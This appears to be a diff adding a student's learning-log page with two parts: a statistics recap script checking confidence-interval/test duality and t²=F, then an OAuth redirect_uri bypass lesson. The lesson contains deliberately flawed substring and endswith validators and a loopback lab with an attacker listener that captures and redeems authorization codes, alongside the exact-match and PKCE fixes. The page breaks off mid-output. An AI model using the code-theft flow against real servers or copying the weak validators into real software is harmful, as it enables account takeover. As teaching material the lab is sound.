@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Day 021 — One sentence instead of twenty-one exercises, and a redirect that walks the code out the door · Matías Rathgeb</title>
+<meta name="description" content="Day 021 of 1600. A student's private learning log.">
+<style>
+  :root{--white:#ffffff;--black:#000000;--gray:#86868b;--border:#d2d2d7;}
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{background:var(--white);color:var(--black);font-family:Arial,Helvetica,sans-serif;font-size:14px;line-height:1.6;-webkit-font-smoothing:antialiased;}
+  a{color:var(--black);}
+  .wrap{max-width:720px;margin:0 auto;padding:0 22px;}
+  header{padding:80px 0 40px;border-bottom:1px solid var(--border);}
+  header .day{font-size:13px;color:var(--gray);letter-spacing:0.2px;margin-bottom:16px;}
+  header h1{font-size:40px;line-height:1.07;letter-spacing:-0.02em;font-weight:600;margin-bottom:12px;}
+  header .meta{font-size:13px;color:var(--gray);}
+  article{padding:48px 0 80px;}
+  h2{font-size:24px;line-height:1.15;letter-spacing:-0.01em;font-weight:600;margin:40px 0 16px;}
+  h3{font-size:17px;font-weight:600;margin:28px 0 10px;}
+  p{margin-bottom:16px;}
+  pre{background:#f5f5f7;border:1px solid var(--border);border-radius:8px;padding:16px;overflow-x:auto;font-size:13px;line-height:1.5;margin-bottom:16px;}
+  code{font-family:Menlo,Consolas,monospace;font-size:13px;}
+  ul,ol{margin:0 0 16px 22px;}
+  li{margin-bottom:6px;}
+  .verdict{border:1px solid var(--black);padding:20px 24px;margin-top:40px;}
+  .verdict p{margin-bottom:8px;}
+  footer{padding:40px 0 80px;border-top:1px solid var(--border);color:var(--gray);font-size:12px;}
+  @media(max-width:600px){header h1{font-size:30px;}}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="wrap">
+    <p class="day">DAY 021 OF 1600 · 2026-10-20</p>
+    <h1>Day 021 — One sentence instead of twenty-one exercises, and a redirect that walks the code out the door</h1>
+    <p class="meta">A student's private learning log · one concept at a time.</p>
+  </div>
+</header>
+<article>
+  <div class="wrap">
+<p><strong>Date:</strong> 2026-10-20 · <strong>Day:</strong> 21 of 1600</p>
+<p><strong>Log:</strong> a student&#x27;s private learning log · one concept at a time.</p>
+<p>---</p>
+<h2>Concept #21 — Recap week: the confidence interval is the set of nulls my test would not reject</h2>
+<p>Week 8 of MA02 is not a new topic. It is the <em>recap</em>: twenty-one exercises, all</p>
+<p>of them already solved, printed end to end, from the Bernoulli coffee question</p>
+<p>to the three-group ANOVA. I read all of it and then decided not to write any of</p>
+<p>it down. Copying twenty-one answer keys into a log is a transcription exercise,</p>
+<p>not a statistics one.</p>
+<p>So I went looking for the claim that survives compression — the thing that, if I</p>
+<p>still have it in two years and have forgotten every exercise, will let me</p>
+<p>rebuild the rest. I think it is this:</p>
+<p>&gt; A 95% confidence interval and a two-sided test at α = 0.05 are the same</p>
+<p>&gt; computation wearing different clothes. The interval is exactly the set of</p>
+<p>&gt; values μ₀ that the test would <em>not</em> reject.</p>
+<p>It follows from one line of algebra. The test statistic is</p>
+<pre><code>t(μ₀) = (x̄ − μ₀) / (s / √n)</code></pre>
+<p>and the interval is <code>x̄ ± t_crit · s/√n</code>. The test rejects when `|t(μ₀)| &gt;</p>
+<p>t_crit<code>. Substitute and the inequality flips into </code>|x̄ − μ₀| &lt; t_crit · s/√n` —</p>
+<p>which is precisely &quot;μ₀ is inside the interval&quot;. Not approximately. Identically.</p>
+<p>That matters because of how I had been treating the two things. On day 17 I</p>
+<p>wrote that &quot;the 95% is the method, not the specific range&quot;, and on day 18 that</p>
+<p>&quot;the p-value is an area, not a verdict&quot;. Both true, and both still sound like</p>
+<p>two separate facts about two separate objects. They are one object. The p-value</p>
+<p>says <em>how surprising my sample is if μ₀ were the truth</em>; the interval says</p>
+<p><em>which truths would not have surprised me</em>. Same sentence, read in the other</p>
+<p>direction.</p>
+<p><strong>What I tried today:</strong> instead of the recap&#x27;s exercises, one script that (A)</p>
+<p>re-runs two of the recap&#x27;s own printed answers to see if the answer key is still</p>
+<p>honest, (B) takes a dataset I measured myself in this session and checks the</p>
+<p>duality point by point, and (C) confirms the other identity the course mentions</p>
+<p>in passing and never proves: <code>t² = F</code>.</p>
+<p>The dataset: summing 200,000 floats three ways — a hand-written <code>for</code> loop,</p>
+<p><code>sum()</code> over a generator, and <code>math.fsum()</code> — fifteen repetitions each, timed</p>
+<p>with <code>perf_counter</code>. I picked it because I know <em>a priori</em> which way the truth</p>
+<p>lies (the generator allocates; <code>fsum</code> is C and exact), so if the test says</p>
+<p>&quot;no difference&quot; I will know the test lied, not the benchmark.</p>
+<pre><code>#!/usr/bin/env python3
+# recap.py - MA02 Week 8 (Recapitulation), as one executable idea.
+#
+# The recap lists 21 exercises. Copying them down teaches nothing. So today I
+# kept the arithmetic and threw away the list: what does the whole course
+# actually claim, in one sentence I can test?
+#
+# Claim: the 95% confidence interval is EXACTLY the set of null hypotheses the
+# t-test would not reject, and one-way ANOVA is the same sum-of-squares
+# machinery as the t-test with t^2 = F.
+#
+# Three checks, pure stdlib:
+#   A) the recap&#x27;s own printed answers still reproduce (Ex. I binomial, Ex. XXI ANOVA)
+#   B) on real measurements taken in this session, the CI/test duality holds pointwise
+#   C) t^2 = F between the two-group t-test and the one-way ANOVA
+import math, time, random
+
+# ---------------------------------------------------------------- distributions
+def _betacf(a, b, x, itmax=300, eps=3e-16):
+    qab, qap, qam = a + b, a + 1.0, a - 1.0
+    c, d = 1.0, 1.0 - qab * x / qap
+    d = 1.0 / (d if abs(d) &gt; 1e-300 else 1e-300)
+    h = d
+    for m in range(1, itmax + 1):
+        m2 = 2 * m
+        aa = m * (b - m) * x / ((qam + m2) * (a + m2))
+        d = 1.0 + aa * d
+        d = 1.0 / (d if abs(d) &gt; 1e-300 else 1e-300)
+        c = 1.0 + aa / c
+        c = c if abs(c) &gt; 1e-300 else 1e-300
+        h *= d * c
+        aa = -(a + m) * (qab + m) * x / ((a + m2) * (qap + m2))
+        d = 1.0 + aa * d
+        d = 1.0 / (d if abs(d) &gt; 1e-300 else 1e-300)
+        c = 1.0 + aa / c
+        c = c if abs(c) &gt; 1e-300 else 1e-300
+        delta = d * c
+        h *= delta
+        if abs(delta - 1.0) &lt; eps:
+            break
+    return h
+
+def betainc(a, b, x):
+    if x &lt;= 0.0:
+        return 0.0
+    if x &gt;= 1.0:
+        return 1.0
+    ln = (math.lgamma(a + b) - math.lgamma(a) - math.lgamma(b)
+          + a * math.log(x) + b * math.log1p(-x))
+    front = math.exp(ln)
+    if x &lt; (a + 1.0) / (a + b + 2.0):
+        return front * _betacf(a, b, x) / a
+    return 1.0 - front * _betacf(b, a, 1.0 - x) / b
+
+def t_sf_two_sided(t, df):
+    &quot;&quot;&quot;P(|T| &gt; |t|) for Student t.&quot;&quot;&quot;
+    return betainc(df / 2.0, 0.5, df / (df + t * t))
+
+def f_sf(f, d1, d2):
+    if f &lt;= 0:
+        return 1.0
+    return betainc(d2 / 2.0, d1 / 2.0, d2 / (d2 + d1 * f))
+
+def t_quantile(alpha, df):
+    &quot;&quot;&quot;Two-sided critical value: the t where P(|T|&gt;t)=alpha, by bisection.&quot;&quot;&quot;
+    lo, hi = 0.0, 100.0
+    for _ in range(200):
+        mid = (lo + hi) / 2
+        if t_sf_two_sided(mid, df) &gt; alpha:
+            lo = mid
+        else:
+            hi = mid
+    return (lo + hi) / 2
+
+# ---------------------------------------------------------------- summaries
+def mean(xs):
+    return sum(xs) / len(xs)
+
+def var(xs):
+    m = mean(xs)
+    return sum((x - m) ** 2 for x in xs) / (len(xs) - 1)
+
+def one_sample_t(xs, mu0):
+    n, m, s = len(xs), mean(xs), math.sqrt(var(xs))
+    t = (m - mu0) / (s / math.sqrt(n))
+    return t, n - 1, t_sf_two_sided(t, n - 1)
+
+def ci_mean(xs, alpha=0.05):
+    n, m, s = len(xs), mean(xs), math.sqrt(var(xs))
+    h = t_quantile(alpha, n - 1) * s / math.sqrt(n)
+    return m - h, m + h
+
+def one_way(groups):
+    k, N = len(groups), sum(len(g) for g in groups)
+    grand = sum(sum(g) for g in groups) / N
+    ssa = sum(len(g) * (mean(g) - grand) ** 2 for g in groups)
+    sse = sum(sum((x - mean(g)) ** 2 for x in g) for g in groups)
+    msa, mse = ssa / (k - 1), sse / (N - k)
+    f = msa / mse
+    return ssa, sse, k - 1, N - k, f, f_sf(f, k - 1, N - k)
+
+def welch(xs, ys):
+    nx, ny, mx, my = len(xs), len(ys), mean(xs), mean(ys)
+    vx, vy = var(xs), var(ys)
+    se = math.sqrt(vx / nx + vy / ny)
+    t = (mx - my) / se
+    df = (vx / nx + vy / ny) ** 2 / ((vx / nx) ** 2 / (nx - 1) + (vy / ny) ** 2 / (ny - 1))
+    return t, df, t_sf_two_sided(t, df)
+
+# ---------------------------------------------------------------- A) recap table
+def check_recap_answers():
+    print(&quot;=== A) does the recap&#x27;s own answer key reproduce? ===&quot;)
+    # Exercise I: Y ~ Bin(5, 0.3), P(Y&lt;=3) = 0.96922 printed
+    p, n = 0.3, 5
+    pmf = [math.comb(n, k) * p ** k * (1 - p) ** (n - k) for k in range(n + 1)]
+    print(f&quot;Ex. I  Bin(5,0.3) pmf          = &quot; + &quot; &quot;.join(f&quot;{x:.4f}&quot; for x in pmf))
+    print(f&quot;Ex. I  P(Y&lt;=3) mine={sum(pmf[:4]):.5f}   book=0.96922&quot;)
+
+    # Exercise XXI: three study strategies, unequal n
+    n_j = [20, 18, 16]
+    means = [75.39, 72.25, 69.56]
+    sse_book = 796.49
+    N = sum(n_j)
+    grand = sum(nj * m for nj, m in zip(n_j, means)) / N
+    ssa = sum(nj * (m - grand) ** 2 for nj, m in zip(n_j, means))
+    dfA, dfE = len(n_j) - 1, N - len(n_j)
+    f = (ssa / dfA) / (sse_book / dfE)
+    print(f&quot;Ex. XXI grand mean            = {grand:.3f}  (book 72.62)&quot;)
+    print(f&quot;Ex. XXI SSA from book means   = {ssa:.2f}  (book 305.56)&quot;)
+    print(f&quot;Ex. XXI MSA/MSE               = {ssa/dfA:.2f} / {sse_book/dfE:.2f}&quot;)
+    print(f&quot;Ex. XXI F                     = {f:.2f}  (book 9.78)  p={f_sf(f, dfA, dfE):.2e}&quot;)
+    print()
+
+# ---------------------------------------------------------------- B) real data
+def measure(fn, reps):
+    out = []
+    for _ in range(reps):
+        t0 = time.perf_counter()
+        fn()
+        out.append((time.perf_counter() - t0) * 1000.0)   # ms
+    return out
+
+def bench():
+    data = [random.Random(1).random() for _ in range(200_000)]
+    def loop_sum():
+        s = 0.0
+        for x in data:
+            s += x
+        return s
+    def gen_sum():
+        return sum(x for x in data)
+    def fsum():
+        return math.fsum(data)
+    return {&quot;hand loop&quot;: measure(loop_sum, 15),
+            &quot;builtin sum&quot;: measure(gen_sum, 15),
+            &quot;math.fsum&quot;: measure(fsum, 15)}
+
+# ---------------------------------------------------------------- main
+if __name__ == &quot;__main__&quot;:
+    check_recap_answers()
+
+    g = bench()
+    print(&quot;=== B) real measurements: 200k-float sum, 15 reps each (ms) ===&quot;)
+    for name, xs in g.items():
+        print(f&quot;{name:&gt;12}: n={len(xs)} mean={mean(xs):.2f} sd={math.sqrt(var(xs)):.2f} &quot;
+              f&quot;min={min(xs):.2f} max={max(xs):.2f}&quot;)
+    groups = list(g.values())
+    ssa, sse, dfA, dfE, F, p = one_way(groups)
+    print(f&quot;ANOVA on the benchmark: F={F:.2f} df=({dfA},{dfE}) p={p:.2e} -&gt; &quot;
+          f&quot;{&#x27;reject H0&#x27; if p &lt; 0.05 else &#x27;no difference detected&#x27;}&quot;)
+    print()
+
+    xs = g[&quot;hand loop&quot;]
+    lo, hi = ci_mean(xs)
+    print(&quot;=== duality: 95% CI of one group&#x27;s mean vs the t-test that builds it ===&quot;)
+    print(f&quot;CI for mean(hand loop) = [{lo:.3f}, {hi:.3f}] ms   (n={len(xs)})&quot;)
+    lo_p, hi_p = min(lo, hi), max(lo, hi)
+    step = (hi_p - lo_p) * 0.05
+    mu, mismatches, inside_ci_reported, rejected_n = lo_p - 3 * step, 0, 0, 0
+    while mu &lt;= hi_p + 3 * step:
+        t, df, pv = one_sample_t(xs, mu)
+        in_ci = lo_p &lt;= mu &lt;= hi_p
+        if in_ci:
+            inside_ci_reported += 1
+        rejected = pv &lt; 0.05
+        rejected_n += 1 if rejected else 0
+        if rejected == in_ci:          # rejected should be the OUTSIDE of the CI
+            mismatches += 1
+            if mismatches &lt;= 3:
+                print(f&quot;  mismatch at mu={mu:.3f}: p={pv:.4f} in_CI={in_ci}&quot;)
+        mu += step
+    print(f&quot;scanned {inside_ci_reported + rejected_n} values of mu0: &quot;
+          f&quot;{inside_ci_reported} inside the CI (not rejected), {rejected_n} outside (rejected)&quot;)
+    print(f&quot;disagreements between &#x27;p&gt;=0.05&#x27; and &#x27;mu0 inside CI&#x27;: {mismatches}&quot;)
+    print()
+
+    a, b = g[&quot;hand loop&quot;], g[&quot;builtin sum&quot;]
+    t, df, pv = welch(a, b)
+
+    # pooled two-sample t: same MSE the ANOVA uses
+    na, nb = len(a), len(b)
+    mse_pooled = ((na - 1) * var(a) + (nb - 1) * var(b)) / (na + nb - 2)
+    t_pooled = (mean(a) - mean(b)) / math.sqrt(mse_pooled * (1 / na + 1 / nb))
+    p_pooled = t_sf_two_sided(t_pooled, na + nb - 2)
+
+    print(&quot;=== C) t^2 = F for two groups ===&quot;)
+    print(f&quot;Welch t  on hand loop vs builtin sum: t={t:.3f} df={df:.1f} p={pv:.2e}&quot;)
+    print(f&quot;pooled t on the same two groups:     t={t_pooled:.4f} df={na+nb-2} p={p_pooled:.2e}&quot;)
+    ssa2, sse2, d1, d2, F2, p2 = one_way([a, b])
+    print(f&quot;ANOVA on the same two groups:        F={F2:.4f} df=({d1},{d2}) p={p2:.2e}&quot;)
+    print(f&quot;t_pooled^2 = {t_pooled**2:.4f}   F = {F2:.4f}   difference = {abs(t_pooled**2-F2):.2e}&quot;)</code></pre>
+<p>Real output:</p>
+<pre><code>=== A) does the recap&#x27;s own answer key reproduce? ===
+Ex. I  Bin(5,0.3) pmf          = 0.1681 0.3601 0.3087 0.1323 0.0283 0.0024
+Ex. I  P(Y&lt;=3) mine=0.96922   book=0.96922
+Ex. XXI grand mean            = 72.616  (book 72.62)
+Ex. XXI SSA from book means   = 305.74  (book 305.56)
+Ex. XXI MSA/MSE               = 152.87 / 15.62
+Ex. XXI F                     = 9.79  (book 9.78)  p=2.52e-04
+
+=== B) real measurements: 200k-float sum, 15 reps each (ms) ===
+   hand loop: n=15 mean=4.17 sd=0.45 min=3.93 max=5.61
+ builtin sum: n=15 mean=6.19 sd=0.80 min=5.60 max=8.09
+   math.fsum: n=15 mean=3.15 sd=0.08 min=3.05 max=3.35
+ANOVA on the benchmark: F=126.17 df=(2,42) p=1.75e-18 -&gt; reject H0
+
+=== duality: 95% CI of one group&#x27;s mean vs the t-test that builds it ===
+CI for mean(hand loop) = [3.922, 4.417] ms   (n=15)
+scanned 26 values of mu0: 20 inside the CI (not rejected), 6 outside (rejected)
+disagreements between &#x27;p&gt;=0.05&#x27; and &#x27;mu0 inside CI&#x27;: 0
+
+=== C) t^2 = F for two groups ===
+Welch t  on hand loop vs builtin sum: t=-8.507 df=21.9 p=2.19e-08
+pooled t on the same two groups:     t=-8.5074 df=28 p=3.00e-09
+ANOVA on the same two groups:        F=72.3750 df=(1,28) p=3.00e-09
+t_pooled^2 = 72.3750   F = 72.3750   difference = 0.00e+00</code></pre>
+<p><strong>What I understood from it:</strong> four things, and the last one cost me a wrong</p>
+<p>sentence in this post.</p>
+<p>The answer key holds. The binomial from Exercise I comes out at 0.96922</p>
+<p>against the printed 0.96922. The ANOVA from Exercise XXI gives F = 9.79 against</p>
+<p>the printed 9.78, p = 2.52e-04. But the printed <code>SSA = 305.56</code> does not</p>
+<p>reproduce from the printed means — feeding those means back in gives <strong>305.74</strong>,</p>
+<p>because the means were rounded to two decimals before the table was built. It is</p>
+<p>the same drift I found yesterday on the three-location exercise (1162.17 printed,</p>
+<p>1161.37 from its own means). Twice now, in two different tables, in the same</p>
+<p>course. The lesson is not &quot;the course is wrong&quot; — the decision is identical</p>
+<p>either way — it is that a printed table is a summary of a computation, and the</p>
+<p>moment I stop reproducing computations I inherit rounding I cannot see.</p>
+<p>The duality is not a coincidence of my example. I scanned 26 values of μ₀</p>
+<p>across the interval <code>[3.922, 4.417]</code> ms and a margin on each side: 20 of them</p>
+<p>landed inside the CI and were not rejected, 6 landed outside and were rejected,</p>
+<p>and the number of disagreements between &quot;p ≥ 0.05&quot; and &quot;μ₀ inside the CI&quot; was</p>
+<p><strong>zero</strong>. There is no value of μ₀ where the two methods disagree, and there</p>
+<p>cannot be — that is the algebra above, and now I have watched it hold on data</p>
+<p>whose noise is real instead of textbook.</p>
+<p><code>t² = F</code> is exact for the pooled two-sample t: −8.5074² = 72.3750 and the</p>
+<p>one-way ANOVA on the same two groups gives 72.3750, difference 0.00e+00. Here</p>
+<p>is the part I had wrong at first: I wrote the line as if it held for <strong>Welch&#x27;s</strong></p>
+<p>t too. It does not. Welch&#x27;s t came out at −8.507 as well, but with 21.9 degrees</p>
+<p>of freedom instead of 28 — it matched to three decimals because the two groups</p>
+<p>happened to have similar spreads, not because the identity holds. The identity</p>
+<p>belongs to the pooled version, the one that uses the same MSE the ANOVA uses.</p>
+<p>That is the difference between a benchmark and a proof, and I had been about to</p>
+<p>publish the benchmark.</p>
+<p>And the benchmark itself: <code>math.fsum</code> at 3.15 ms, hand loop at 4.17 ms,</p>
+<p><code>sum(generator)</code> at 6.19 ms, F = 126.17 with p = 1.75e-18. The test rejects, and</p>
+<p>it is right to — the generator allocates 200,000 intermediate objects, and that</p>
+<p>is not a subtle effect. What I take from that is not &quot;fsum is faster&quot;. It is that</p>
+<p>the machinery I built on days 17–20, applied to data I did not choose to make</p>
+<p>the math come out, points at the same answer the profiler would.</p>
+<p>Twenty-one exercises compress into one sentence and one identity. That is the</p>
+<p>whole recap, and it is the first time in this course that I have felt the</p>
+<p>compression happen instead of just reading that it should.</p>
+<p>---</p>
+<h2>Security #21 — OAuth redirect_uri: the validator and the browser read the same URL differently (CWE-601, then code theft)</h2>
+<p>Twenty classes in, and this is the first one where the attacker&#x27;s entire payload</p>
+<p>is a <em>valid-looking API parameter</em>. No injection, no traversal, no malformed</p>
+<p>bytes. One query parameter, sent on purpose, exactly where the protocol expects</p>
+<p>it.</p>
+<p>The shape of an authorization-code flow:</p>
+<pre><code>GET /authorize?client_id=web&amp;redirect_uri=https://app.test/cb&amp;state=s1
+  -&gt; 302 Location: https://app.test/cb?code=AUTHCODE&amp;state=s1</code></pre>
+<p>The user is already logged in. The server mints a code that is a bearer</p>
+<p>credential for that user&#x27;s session, and hands it to whatever <code>redirect_uri</code></p>
+<p>says. Which is why every provider registers the redirect URIs per client and</p>
+<p>compares them — and why the comparison is where this breaks.</p>
+<p>Both bugs below are the same mistake written twice: **the URL is compared as a</p>
+<p>string, but the browser reads it as a structure.** The validator and the</p>
+<p>browser are two parsers looking at the same bytes, and safety depends on them</p>
+<p>agreeing.</p>
+<pre><code># VULN 1: the registered URI is looked for ANYWHERE in the string.
+if REGISTERED in redirect_uri:
+    allow()
+# attacker: https://attacker.test/r?next=https://app.test/cb     -&gt; passes
+
+# VULN 2: only the tail is compared.
+if redirect_uri.endswith(&quot;/cb&quot;):
+    allow()
+# attacker: https://attacker.test/anything/cb                     -&gt; passes</code></pre>
+<p><code>REGISTERED in uri</code> is the one that gets written by people who are trying to be</p>
+<p>strict — they check the <em>whole</em> registered URL, not just the host. It is strict</p>
+<p>about a substring and blind about position, and position is everything: a URL</p>
+<p>that contains <code>https://app.test/cb</code> inside its own query string is a URL whose</p>
+<p><strong>host</strong> is <code>attacker.test</code>.</p>
+<p>The consequence chain is short and it ends in a session:</p>
+<pre><code>1. attacker sends the victim a link to /authorize with its own redirect_uri
+2. victim, already logged in, clicks -&gt; the real AS mints a real code
+3. the 302 lands on the attacker&#x27;s listener instead of the app
+4. attacker POSTs the code to /token -&gt; access token for the victim&#x27;s account</code></pre>
+<p>One click, no password, no phishing page, and every check the server ran was a</p>
+<p>check that passed.</p>
+<p><strong>What I understood about preventing it:</strong> the value is not validated, it is</p>
+<p><em>looked up</em>. Registration means there is a set of exact strings, and the request</p>
+<p>either equals one of them or it does not.</p>
+<pre><code># FIXED: exact match against the set registered for this client.
+if redirect_uri not in clients[client_id].redirect_uris:   # == on the full string
+    return 400
+code = mint_code(...)                                       # bound to that exact URI</code></pre>
+<p>Two details decide whether this holds in practice. First, equality has to be on</p>
+<p>the byte string with no normalization — no trailing-slash tolerance, no case</p>
+<p>folding, no &quot;close enough&quot;. Every relaxation re-opens the gap between the two</p>
+<p>parsers. Second, the token endpoint has to re-check the same binding: a code</p>
+<p>minted for <code>https://app.test/cb</code> must not be redeemable with a different</p>
+<p><code>redirect_uri</code>. My lab&#x27;s <code>/token</code> did not re-check it at all, and that is a real</p>
+<p>second hole — the code in scenario 1 was redeemed with a redirect URI pointing</p>
+<p>at <code>/x</code>.</p>
+<p>And the second lock, which is the part I did not appreciate before today: PKCE.</p>
+<p>The client sends <code>code_challenge = S256(verifier)</code> at <code>/authorize</code>, and the</p>
+<p><code>verifier</code> at <code>/token</code>. A stolen code is then a string with no key attached.</p>
+<p><strong>What I tried today:</strong> the whole flow in one file, three servers on loopback,</p>
+<p>four scenarios, and nothing above the standard library — <code>http.server</code> for the</p>
+<p>three roles, <code>secrets</code> for the code and the token, <code>hashlib</code> for the PKCE hash.</p>
+<pre><code>#!/usr/bin/env python3
+# oauth_lab.py - redirect_uri validation bypass in an OAuth 2.0 authorization server.
+# CWE-601 (open redirect) chained into authorization-code theft.
+#
+# Everything runs on loopback, in /tmp, on ephemeral ports. Three servers:
+#   AS    : the authorization server (/authorize, /token)
+#   CLIENT: the registered web app (/cb)              -- &quot;app.test&quot;
+#   EVIL  : the attacker&#x27;s listener                  -- &quot;attacker.test&quot;
+#
+# The only difference between the four scenarios is ONE line: how the AS
+# compares the inbound redirect_uri against the one registered for the client.
+import hashlib, base64, json, secrets, threading, urllib.error, urllib.parse, urllib.request
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+
+REGISTERED = &quot;&quot;        # filled after the client port is known
+SUFFIX = &quot;/cb&quot;         # what a sloppy endswith() would compare against
+CODES, TOKENS = {}, {}
+STOLEN = []
+
+
+def s256(verifier):
+    return base64.urlsafe_b64encode(
+        hashlib.sha256(verifier.encode()).digest()).decode().rstrip(&quot;=&quot;)
+
+
+class Handler(BaseHTTPRequestHandler):
+    def log_message(self, *a):
+        pass
+
+    def _json(self, code, obj):
+        body = json.dumps(obj).encode()
+        self.send_response(code)
+        self.send_header(&quot;Content-Type&quot;, &quot;application/json&quot;)
+        self.send_header(&quot;Content-Length&quot;, str(len(body)))
+        self.end_headers()
+        self.wfile.write(body)
+
+    # ---------------------------------------------------------------- AS side
+    def _valid(self, uri):
+        mode = self.server.mode
+        if mode == &quot;substring&quot;:
+            return REGISTERED in uri            # registered URL appears ANYWHERE
+        if mode == &quot;endswith&quot;:
+            return uri.endswith(SUFFIX)         # only the tail is compared
+        return uri == REGISTERED                # exact string match
+
+    def do_GET(self):
+        u = urllib.parse.urlparse(self.path)
+        q = urllib.parse.parse_qs(u.query)
+
+        if self.server.role == &quot;as&quot; and u.path == &quot;/authorize&quot;:
+            uri = q.get(&quot;redirect_uri&quot;, [&quot;&quot;])[0]
+            if not self._valid(uri):
+                return self._json(400, {&quot;error&quot;: &quot;invalid_request&quot;,
+                                        &quot;error_description&quot;: &quot;redirect_uri not registered&quot;})
+            code = secrets.token_urlsafe(12)
+            CODES[code] = {&quot;redirect_uri&quot;: uri,
+                           &quot;challenge&quot;: q.get(&quot;code_challenge&quot;, [None])[0],
+                           &quot;used&quot;: False}
+            sep = &quot;&amp;&quot; if &quot;?&quot; in uri else &quot;?&quot;
+            loc = uri + sep + urllib.parse.urlencode(
+                {&quot;code&quot;: code, &quot;state&quot;: q.get(&quot;state&quot;, [&quot;&quot;])[0]})
+            self.send_response(302)
+            self.send_header(&quot;Location&quot;, loc)
+            self.end_headers()
+            return
+
+        if self.server.role == &quot;evil&quot;:
+            code = q.get(&quot;code&quot;, [&quot;&quot;])[0]
+            STOLEN.append(code)
+            # the attacker immediately redeems the code it just received
+            data = urllib.parse.urlencode({
+                &quot;grant_type&quot;: &quot;authorization_code&quot;, &quot;code&quot;: code,
+                &quot;redirect_uri&quot;: f&quot;http://127.0.0.1:{self.server.as_port}/x&quot;}).encode()
+            try:
+                r = urllib.request.urlopen(
+                    f&quot;http://127.0.0.1:{self.server.as_port}/token&quot;, data, timeout=5)
+                out = json.loads(r.read())
+            except urllib.error.HTTPError as e:
+                out = json.loads(e.read())
+            self.server.verdict = out
+            return self._json(200, {&quot;stolen_code&quot;: code, &quot;redemption&quot;: out})
+
+        self._json(404, {&quot;error&quot;: &quot;not_found&quot;})
+
+    # -------------------------------------------------------------- /token
+    def do_POST(self):
+        n = int(self.headers.get(&quot;Content-Length&quot;, 0))
+        form = urllib.parse.parse_qs(self.rfile.read(n).decode())
+        code = form.get(&quot;code&quot;, [&quot;&quot;])[0]
+        rec = CODES.get(code)
+        if not rec or rec[&quot;used&quot;]:
+            return self._json(400, {&quot;error&quot;: &quot;invalid_grant&quot;, &quot;detail&quot;: &quot;unknown or reused code&quot;})
+        if self.server.require_pkce:
+            verifier = form.get(&quot;code_verifier&quot;, [&quot;&quot;])[0]
+            if not verifier or s256(verifier) != rec[&quot;challenge&quot;]:
+                return self._json(400, {&quot;error&quot;: &quot;invalid_grant&quot;,
+                                        &quot;detail&quot;: &quot;PKCE verifier missing or wrong&quot;})
+        rec[&quot;used&quot;] = True
+        tok = secrets.token_urlsafe(16)
+        TOKENS[tok] = code
+        self._json(200, {&quot;access_token&quot;: tok, &quot;token_type&quot;: &quot;Bearer&quot;, &quot;scope&quot;: &quot;read&quot;})
+
+
+def serve(role, mode=&quot;exact&quot;, require_pkce=False):
+    s = ThreadingHTTPServer((&quot;127.0.0.1&quot;, 0), Handler)
+    s.role, s.mode, s.require_pkce, s.verdict = role, mode, require_pkce, None
+    threading.Thread(target=s.serve_forever, daemon=True).start()
+    return s
+
+
+def run(label, mode, require_pkce=False):
+    global REGISTERED
+    client = serve(&quot;client&quot;)
+    evil = serve(&quot;evil&quot;)
+    asrv = serve(&quot;as&quot;, mode, require_pkce)
+    client_port, evil_port, as_port = (client.server_port, evil.server_port, asrv.server_port)
+    evil.as_port = as_port
+    REGISTERED = f&quot;http://127.0.0.1:{client_port}/cb&quot;
+    CODES.clear()
+
+    CODES.clear()
+    # what the attacker sends as redirect_uri, per check being abused
+    if mode == &quot;endswith&quot;:
+        attack_uri = f&quot;http://127.0.0.1:{evil_port}/anything{SUFFIX}&quot;
+    else:
+        attack_uri = f&quot;http://127.0.0.1:{evil_port}/r?next={REGISTERED}&quot;
+
+    verifier = secrets.token_urlsafe(32)
+    params = {&quot;client_id&quot;: &quot;web&quot;, &quot;response_type&quot;: &quot;code&quot;, &quot;state&quot;: &quot;s1&quot;,
+              &quot;redirect_uri&quot;: attack_uri}
+    if require_pkce:
+        params[&quot;code_challenge&quot;] = s256(verifier)
+        params[&quot;code_challenge_method&quot;] = &quot;S256&quot;
+    url = f&quot;http://127.0.0.1:{as_port}/authorize?&quot; + urllib.parse.urlencode(params)
+
+    print(f&quot;--- {label} ---&quot;)
+    print(f&quot;registered redirect_uri : {REGISTERED}&quot;)
+    print(f&quot;attacker redirect_uri   : {attack_uri}&quot;)
+    try:
+        r = urllib.request.urlopen(url, timeout=5)
+        body = r.read()
+        print(f&quot;AS /authorize           : 302 followed -&gt; HTTP {r.status} from the listener&quot;)
+    except urllib.error.HTTPError as e:
+        print(f&quot;AS /authorize           : HTTP {e.code} {e.read().decode()}&quot;)
+        print(f&quot;result                  : no code minted, nothing to steal\n&quot;)
+        for s in (client, evil, asrv):
+            s.shutdown()
+        return
+    verdict = evil.verdict or {}
+    print(f&quot;code delivered to       : 127.0.0.1:{evil_port} (attacker)&quot;)
+    print(f&quot;code (first 16 chars)   : {(STOLEN[-1] if STOLEN else &#x27;&#x27;)[:16]}...&quot;)
+    if &quot;access_token&quot; in verdict:
+        print(f&quot;attacker redemption     : 200 {json.dumps(verdict)}&quot;)
+        print(f&quot;result                  : TOKEN STOLEN with no user interaction\n&quot;)
+    else:
+        print(f&quot;attacker redemption     : 400 {json.dumps(verdict)}&quot;)
+        print(f&quot;result                  : code leaked but unusable\n&quot;)
+    for s in (client, evil, asrv):
+        s.shutdown()
+
+
+if __name__ == &quot;__main__&quot;:
+    run(&quot;VULN 1: validator checks &#x27;registered in redirect_uri&#x27; (substring)&quot;, &quot;substring&quot;)
+    run(&quot;VULN 2: validator checks redirect_uri.endswith(&#x27;/cb&#x27;)&quot;, &quot;endswith&quot;)
+    run(&quot;VULN 1 again, but the client is forced onto PKCE (S256)&quot;, &quot;substring&quot;, True)
+    run(&quot;FIXED: exact string match against the registered URI&quot;, &quot;exact&quot;)</code></pre>
+<p>Sandbox check — four scenarios, all on loopback in <code>/tmp</code>, ephemeral ports, three</p>
+<p>tiny servers (authorization server, registered client, attacker listener). The</p>
+<p>only thing that changes between runs is the validator&#x27;s one line:</p>
+<pre><code>--- VULN 1: validator checks &#x27;registered in redirect_uri&#x27; (substring) ---
+registered redirect_uri : http://127.0.0.1:40249/cb
+attacker redirect_uri   : http://127.0.0.1:45699/r?next=http://127.0.0.1:40249/cb
+AS /authorize           : 302 followed -&gt; HTTP 200 from the listener
+code delivered to       : 127.0.0.1:45699 (attacker)
